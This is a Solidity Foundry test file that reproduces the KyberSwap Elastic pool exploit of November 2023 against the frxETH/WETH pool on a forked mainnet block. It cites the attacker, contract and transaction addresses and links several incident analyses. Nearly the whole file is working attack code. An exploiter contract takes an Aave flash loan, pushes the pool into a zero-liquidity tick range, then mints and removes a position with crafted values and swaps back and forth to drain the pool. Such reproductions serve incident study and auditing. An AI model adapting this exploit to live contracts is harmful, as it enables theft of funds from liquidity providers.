// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

import {IBasePositionManager as IKyberswapPositionManager} from "./KyberSwap/interfaces/periphery/IBasePositionManager.sol";
import {IPool as IKyberswapPool} from "./KyberSwap/interfaces/IPool.sol";

// @KeyInfo - Total Lost : ~$46M
// Attacker EOA: https://etherscan.io/address/0x50275E0B7261559cE1644014d4b78D4AA63BE836
// Attacker Contracts : https://etherscan.io/address/0xaf2acf3d4ab78e4c702256d214a3189a874cdc13
// Vulnerable Contract : https://etherscan.io/address/0xFd7B111AA83b9b6F547E617C7601EfD997F64703
// Transaction : https://phalcon.blocksec.com/explorer/tx/eth/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3 (block 18630392)

// @Analysis
// https://phalcon.blocksec.com/explorer/security-incidents
// https://twitter.com/BlockSecTeam/status/1727560157888942331
// https://blocksec.com/blog/yet-another-tragedy-of-precision-loss-an-in-depth-analysis-of-the-kyber-swap-incident-1
// https://blog.solidityscan.com/kyberswap-hack-analysis-25e25f2e4a7b
// https://slowmist.medium.com/a-deep-dive-into-the-kyberswap-hack-3e13f3305d3a

// AAVE INTERFACES ////////////////////////////////////////////////////////////

interface IAavePool {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes memory params, uint16 referralCode) external;
}

// UNISWAP V3 INTERFACES //////////////////////////////////////////////////////

interface IUniswapV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
}

// LOGGING ////////////////////////////////////////////////////////////////////

contract Logger is Test {
    function logTag(string memory stage, string memory token, string memory label) internal returns (string memory) {
        string memory text_stage = string(abi.encodePacked(" [ ", stage, " ] "));
        string memory text_token = string(abi.encodePacked(" [ ", token, " ] "));
        string memory text_label = string(abi.encodePacked(" [ ", label, " ] "));
        return string(abi.encodePacked(text_stage, text_token, text_label));
    }

    function logBalances(string memory stage_label, string memory token_label, string memory target_label, address target, address token) internal {
        emit log_named_decimal_uint(logTag(stage_label, token_label, target_label), IERC20(token).balanceOf(target), IERC20(token).decimals());
    }
}

// CORE LOGIC /////////////////////////////////////////////////////////////////

contract Exploiter is Test {
    address public _attacker = address(0);
    address public _victim = address(0);
    address public _lender = address(0);
    address public _token0 = address(0);
    address public _token1 = address(0);
    uint256 public _amount = 0;
    address public _manager = address(0xe222fBE074A436145b255442D919E4E3A6c6a480);

    constructor(address victim, address lender, uint256 amount) {
        _attacker = address(this);
        _victim = victim;
        _lender = lender;
        _token0 = address(IKyberswapPool(_victim).token0());
        _token1 = address(IKyberswapPool(_victim).token1());
        _amount = amount;
    }

    // entry point ////////////////////////////////////////////////////////////
    function trigger() public {
        IAavePool(_lender).flashLoanSimple(address(this), _token1, _amount, "", 0);
    }

    // core ///////////////////////////////////////////////////////////////////
    function _flashCallback(uint256 due) internal returns (bool) {
        int24 __currentTick;
        int24 __nearestCurrentTick;
        uint24 __swap_fee;
        uint160 __sqrtP;
        uint256 __token_id;

        // settings
        __swap_fee = IKyberswapPool(_victim).swapFeeUnits(); // 10

        // approval is required to mint the position
        IERC20(_token0).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        IERC20(_token1).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);

        // step 1: move to a tick range with 0 liquidity
        IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
        
        // step 2: supply liquidity
        (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
        (__token_id,,,) = IKyberswapPositionManager(_manager).mint(IKyberswapPositionManager.MintParams(_token0, _token1, __swap_fee, __currentTick, 111310, [__nearestCurrentTick, __nearestCurrentTick], 6948087773336076, 107809615846697233, 0, 0, _attacker, block.timestamp));

        // step 3: remove liquidity
        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, 14938549516730950591, 0, 0, block.timestamp));

        // step 4: back and forth swaps
        IKyberswapPool(_victim).swap(_attacker, 387170294533119999999, false, 1461446703485210103287273052203988822378723970341, "");
        IKyberswapPool(_victim).swap(_attacker, -int256(IERC20(_token1).balanceOf(_victim)), false, 4295128740, "");

        // repay the lender
        IERC20(_token1).approve(_lender, due);

        return true;
    }

    // swap / tick manipulation ///////////////////////////////////////////////
    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) external {
        if (deltaQty0 > 0) {
            IERC20(_token0).transfer(msg.sender, uint256(deltaQty0));
        } else if (deltaQty1 > 0) {
            IERC20(_token1).transfer(msg.sender, uint256(deltaQty1));
        }
    }

    // flash loan / funding callbacks /////////////////////////////////////////

    // Aave
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes memory params) external returns (bool) {
        return _flashCallback(amount + premium);
    }

    // Uniswap v3
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        _flashCallback(fee1);
    }
}

// frxETH <=> WETH POOL EXPLOIT ///////////////////////////////////////////////

contract KyberswapFrxEthWethPoolExploitTest is Exploiter, Logger {
    string private constant _chain = "mainnet";
    uint256 private constant _block = 18_630_391;

    // victim = KS2-RT, lender = Aave pool v3, amount = 2,000,000,000,000,000,000,000
    constructor() Exploiter(address(0xFd7B111AA83b9b6F547E617C7601EfD997F64703), address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2), 0x6c6b935b8bbd400000) Logger() {}

    function setUp() public {
        vm.createSelectFork(_chain, _block);
        vm.label(_victim, "KS2-RT");
        vm.label(_lender, "Aave: Pool V3");
        vm.label(_token0, "frxETH");
        vm.label(_token1, "WETH");
    }

    function testExploit() public {
        // track changes

        // log pre-exploit
        logBalances("before", "token0", "victim", _victim, _token0);
        logBalances("before", "token1", "victim", _victim, _token1);
        logBalances("before", "token0", "attacker", _attacker, _token0);
        logBalances("before", "token1", "attacker", _attacker, _token1);

        // main
        trigger();

        // log post-exploit
        logBalances("after", "token0", "victim", _victim, _token0);
        logBalances("after", "token1", "victim", _victim, _token1);
        logBalances("after", "token0", "attacker", _attacker, _token0);
        logBalances("after", "token1", "attacker", _attacker, _token1);
    }
}
